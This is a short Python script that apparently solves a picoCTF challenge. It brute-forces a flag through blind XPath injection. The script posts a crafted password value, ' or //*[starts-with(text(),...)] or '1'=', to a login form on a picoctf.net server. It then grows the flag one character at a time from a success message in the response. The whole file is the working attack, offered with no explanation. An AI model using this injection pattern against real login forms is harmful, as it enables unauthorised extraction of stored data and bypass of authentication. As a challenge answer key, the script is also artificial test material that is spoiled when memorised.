import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_"

flag = "picoCTF{"
while "}" not in flag:

    for ch in chars:
        print(flag + ch)
        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{flag + ch}')] or '1'='"}
        r = requests.post("http://mercury.picoctf.net:59946/", data=data)
        content = r.text
        if "You&#39;re on the right path." in content:
            flag += ch
            break
